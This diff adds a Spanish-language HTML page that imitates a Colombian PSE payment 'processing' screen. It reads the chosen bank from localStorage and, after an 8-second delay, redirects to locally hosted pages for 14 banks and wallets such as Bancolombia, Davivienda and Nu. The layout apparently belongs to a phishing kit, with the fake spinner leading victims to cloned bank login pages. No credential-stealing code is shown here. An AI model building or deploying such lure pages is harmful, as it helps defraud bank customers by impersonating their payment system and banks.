@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Procesando</title>
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial;
+}
+
+body{
+background:#fff;
+height:100vh;
+display:flex;
+flex-direction:column;
+justify-content:space-between;
+}
+
+.header{
+text-align:center;
+padding-top:20px;
+}
+
+.header img{
+width:160px;
+}
+
+.center{
+text-align:center;
+}
+
+.center img{
+width:180px;
+margin-bottom:20px;
+}
+
+.text{
+font-size:16px;
+color:#200020;
+padding:0 30px;
+line-height:1.4;
+}
+
+.footer{
+height:40px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+<img src="logo2.svg">
+</div>
+
+<div class="center">
+<img src="procesando.gif">
+
+<div class="text">
+Estamos procesando tu solicitud con PSE.<br>
+Esto puede tardar unos segundos...
+</div>
+</div>
+
+<div class="footer"></div>
+
+<script>
+const banco = localStorage.getItem("banco");
+
+if (!banco) {
+window.location.href = "index.html";
+}
+
+const rutas = {
+"BANCO DAVIVIENDA":"Banco/Davivienda/index.html",
+"BANCO DE BOGOTA":"Banco/Bogota/index.html",
+"BANCO POPULAR":"Banco/Popular/index.html",
+"BANCO BBVA COLOMBIA S.A.":"Banco/BBVA/index.html",
+"BANCO AV VILLAS":"Banco/AvVillas/index.html",
+"BANCO DE OCCIDENTE":"Banco/Occidente/index.html",
+"BANCO FALABELLA":"Banco/Falabella/index.html",
+"BANCO GNB SUDAMERIS":"Banco/Gnb/index.html",
+"BANCO ITAU":"Banco/Itau/index.html",
+"DAVIPLATA":"Banco/Daviplata/index.html",
+"BANCOLOMBIA":"Banco/Bancolombia/index.html",
+"GLOBAL66":"Banco/Global66/index.html",
+"BANCO CAJA SOCIAL":"Banco/Social/index.html",
+"NU":"Banco/Nu/index.html"
+};
+
+setTimeout(() => {
+
+if (rutas[banco]) {
+window.location.href = rutas[banco];
+} else {
+window.location.href = "index.html";
+}
+
+}, 8000);
+</script>
+
+</body>
+</html>
